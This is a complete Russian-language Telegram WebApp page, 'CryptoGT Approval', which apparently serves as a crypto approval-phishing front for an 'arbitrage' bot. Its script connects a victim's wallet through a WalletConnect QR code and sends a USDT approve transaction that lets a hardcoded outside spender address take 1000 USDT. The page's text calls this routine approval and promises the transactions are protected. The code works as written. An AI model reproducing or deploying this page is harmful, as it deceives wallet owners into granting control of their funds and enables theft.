<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>WalletConnect Approval – CryptoGT</title>
  
  <!-- Официальный скрипт Telegram WebApp -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  
  <!-- Web3 и QRCode -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>

  <style>
    /* Стили остаются без изменений */
    :root { --tg-bg: #17212b; --tg-text: #ffffff; --tg-hint: #708499; --tg-primary: #2ea6ff; --tg-danger: #e64a45; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: var(--tg-bg); color: var(--tg-text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; min-height: 100vh; padding: 20px 15px; line-height: 1.5; }
    .container { max-width: 500px; margin: 0 auto; display: flex; flex-direction: column; min-height: 95vh; }
    header { text-align: center; margin-bottom: 30px; padding-top: 10px; }
    h1 { font-size: 22px; margin-bottom: 5px; font-weight: 600; }
    .subtitle { color: var(--tg-hint); font-size: 15px; }
    .card { background: rgba(255, 255, 255, 0.05); border-radius: 16px; padding: 25px; margin-bottom: 20px; text-align: center; }
    #status { font-size: 17px; margin-bottom: 20px; min-height: 80px; display: flex; align-items: center; justify-content: center; white-space: pre-wrap; }
    #qr-container { width: 220px; height: 220px; margin: 0 auto 20px; background: white; padding: 10px; border-radius: 12px; }
    #qr { width: 100%; height: 100%; }
    #uriText { margin-top: 10px; word-break: break-all; font-size: 12px; color: var(--tg-primary); text-align: center; }
    .instructions { background: rgba(46, 166, 255, 0.1); border-radius: 12px; padding: 15px; margin: 20px 0; text-align: left; font-size: 14px; }
    .instructions h3 { margin-bottom: 8px; color: var(--tg-primary); }
    .instructions ol { padding-left: 20px; }
    .instructions li { margin-bottom: 5px; }
    .btn-group { display: flex; gap: 10px; margin-top: auto; padding-top: 20px; }
    button { flex: 1; padding: 15px; border-radius: 12px; border: none; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
    #cancelBtn { background: rgba(255, 255, 255, 0.08); color: var(--tg-text); }
    #cancelBtn:hover { background: rgba(255, 255, 255, 0.15); }
    #openInTg { background: var(--tg-primary); color: white; }
    #openInTg:hover { opacity: 0.9; }
    .warning { color: #ffa726; }
    .success { color: #66bb6a; }
    .error { color: var(--tg-danger); }
    .hidden { display: none; }
    footer { text-align: center; margin-top: 30px; color: var(--tg-hint); font-size: 13px; }
    .browser-warning { background: rgba(230, 74, 69, 0.15); border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: center; }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>CryptoGT Approval</h1>
      <div class="subtitle">Подтвердите транзакцию через WalletConnect</div>
    </header>

    <div id="browserWarning" class="browser-warning hidden">
      <p>⚠️ Для корректной работы откройте это приложение через Telegram-бота</p>
    </div>

    <div class="card">
      <div id="status">Инициализация приложения...</div>
      <div id="qr-container"><canvas id="qr"></canvas></div>
      <div id="uriText" class="hidden"></div>
      <div id="gasInfo" class="hidden">
        <div>Расчетный газ: <span id="gasEstimate">0</span> Gwei</div>
      </div>
    </div>

    <div id="instructions" class="instructions hidden">
      <h3>Как подключить:</h3>
      <ol>
        <li>Откройте Trust Wallet или MetaMask на вашем устройстве</li>
        <li>Нажмите на кнопку "Scan QR code"</li>
        <li>Наведите камеру на QR-код выше</li>
        <li>Подтвердите подключение в кошельке</li>
      </ol>
    </div>

    <div class="btn-group">
      <button id="cancelBtn">Отменить</button>
      <button id="openInTg" class="hidden">Открыть в Telegram</button>
    </div>

    <footer>
      <div>© 2023 CryptoGT</div>
      <div>Все транзакции защищены</div>
    </footer>
  </div>

  <script type="module">
    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";

    // ─── Конфигурация ─────────────────────────────────────────────────────
    const CONFIG = {
      USDT_CONTRACT:    "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
      ARB_SPENDER:      "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
      WC_PROJECT_ID:    "d868f90cd734355ae0320f8f0258b6b1",
      WC_RELAY_URL:     "wss://relay.walletconnect.com",
      BSC_RPC_URL:      "https://bsc-dataseed.binance.org/",
      TELEGRAM_BOT_URL: "https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
      AMOUNT:           "1000" // USDT
    };

    // ─── Элементы DOM ────────────────────────────────────────────────────
    const statusEl       = document.getElementById("status");
    const qrCanvas       = document.getElementById("qr");
    const uriTextEl      = document.getElementById("uriText");
    const cancelBtn      = document.getElementById("cancelBtn");
    const openInTgBtn    = document.getElementById("openInTg");
    const instructionsEl = document.getElementById("instructions");
    const browserWarning = document.getElementById("browserWarning");
    const gasEstimateEl  = document.getElementById("gasEstimate");
    const gasInfo        = document.getElementById("gasInfo");

    // ─── Определение среды выполнения ───────────────────────────────────
    const isTelegramWebApp = () => {
      // Проверяем наличие объекта Telegram.WebApp и его параметров
      return window.Telegram && 
             window.Telegram.WebApp && 
             window.Telegram.WebApp.initData;
    };

    // ─── Инициализация Telegram WebApp ──────────────────────────────────
    const initTelegramWebApp = () => {
      if (isTelegramWebApp()) {
        console.log("[Telegram] WebApp инициализирован");
        console.log(`[Telegram] Версия платформы: ${Telegram.WebApp.platform}`);
        console.log(`[Telegram] Параметры запуска:`, Telegram.WebApp.initData);
        
        // Инициализируем WebApp
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        return true;
      }
      return false;
    };

    // ─── Обновление статуса ────────────────────────────────────────────
    function updateStatus(text, type) {
      statusEl.textContent = text;
      statusEl.className = type || "";
    }

    // ─── Основная логика WalletConnect ─────────────────────────────────
    async function initWalletConnect() {
      try {
        // Определяем среду выполнения
        const isWebView = initTelegramWebApp();
        console.log(`[Env] WebView detected: ${isWebView}`);
        
        if (!isWebView) {
          browserWarning.classList.remove("hidden");
          openInTgBtn.classList.remove("hidden");
          instructionsEl.classList.remove("hidden");
          openInTgBtn.addEventListener("click", () => {
            window.open(CONFIG.TELEGRAM_BOT_URL, "_blank");
          });
        }

        // Подготовка суммы
        updateStatus("Подготовка транзакции...");
        const amountWei = Web3.utils
          .toBN(CONFIG.AMOUNT)
          .mul(Web3.utils.toBN("1000000000000000000"))
          .toString();

        // Инициализация SignClient
        updateStatus("Инициализация WalletConnect...");
        const client = await SignClient.init({
          projectId: CONFIG.WC_PROJECT_ID,
          relayUrl:  CONFIG.WC_RELAY_URL,
          metadata: {
            name:        "CryptoGT Approval",
            description: "Approve USDT transaction via WalletConnect",
            url:         window.location.href,
            icons:       ["https://cryptogt.app/icon.png"],
          },
          storageOptions: { database: ":memory:" },
        });

        // Генерация сессии
        updateStatus("Генерация подключения...");
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_chainId"],
              chains:  ["eip155:56"],
              events:  ["chainChanged"],
            },
          },
        });

        // Отображение QR-кода
        updateStatus("Отсканируйте QR-код в кошельке");
        instructionsEl.classList.remove("hidden");
        QRCode.toCanvas(qrCanvas, uri, { width: 200, margin: 1 });
        uriTextEl.textContent = uri;
        uriTextEl.classList.remove("hidden");

        // Ожидание подключения
        updateStatus("Ожидание подключения кошелька...");
        await approval();
        const topic = client.session.topic;

        // Проверка сети
        updateStatus("Проверка сети...");
        const chainId = await client.request({
          topic,
          chainId: "eip155:56",
          request: { method: "eth_chainId" },
        });
        if (chainId !== "0x38") {
          throw new Error("Пожалуйста, переключитесь на Binance Smart Chain (chainId: 56)");
        }

        // Подготовка транзакции
        updateStatus("Подготовка данных...");
        const web3 = new Web3(CONFIG.BSC_RPC_URL);
        const approveABI = {
          constant: false,
          inputs: [
            { name: "spender", type: "address" },
            { name: "amount",  type: "uint256" }
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        };
        const data = web3.eth.abi.encodeFunctionCall(
          approveABI,
          [CONFIG.ARB_SPENDER, amountWei]
        );

        // Расчет газа
        updateStatus("Расчет комиссии...");
        const gasEstimate = await web3.eth.estimateGas({ to: CONFIG.USDT_CONTRACT, data });
        const gasPrice = await web3.eth.getGasPrice();
        const gasPriceGwei = Math.round(web3.utils.fromWei(gasPrice, "gwei"));
        gasInfo.classList.remove("hidden");
        gasEstimateEl.textContent = gasPriceGwei;

        const txParams = {
          to:       CONFIG.USDT_CONTRACT,
          data:     data,
          gas:      web3.utils.toHex(Math.round(gasEstimate * 1.2)),
          gasPrice: gasPrice
        };

        // Отправка транзакции
        updateStatus("Подтвердите транзакцию в кошельке...");
        const txHash = await client.request({
          topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [txParams],
          },
        });

        // Успешное завершение
        updateStatus(`✅ Транзакция успешно отправлена!\n\nTX Hash:\n${txHash}`, "success");
        
        if (isWebView) {
          setTimeout(() => {
            console.log("[Telegram] Закрываем WebApp");
            Telegram.WebApp.sendData(JSON.stringify({ txHash }));
            Telegram.WebApp.close();
          }, 5000);
        }
      } catch (err) {
        console.error("[Error]", err);
        updateStatus(`❌ Ошибка: ${err.message || err}`, "error");
        
        // Отправка ошибки в Telegram
        if (isTelegramWebApp()) {
          Telegram.WebApp.sendData(JSON.stringify({ 
            error: err.message || "Unknown error" 
          }));
        }
      }
    }

    // ─── Обработчики событий ────────────────────────────────────────────
    cancelBtn.addEventListener("click", () => {
      if (isTelegramWebApp()) {
        Telegram.WebApp.close();
      } else {
        if (confirm("Закрыть приложение?")) window.close();
      }
    });

    // ─── Запуск приложения ─────────────────────────────────────────────
    document.addEventListener("DOMContentLoaded", () => {
      setTimeout(initWalletConnect, 300);
    });
  </script>
</body>
</html>
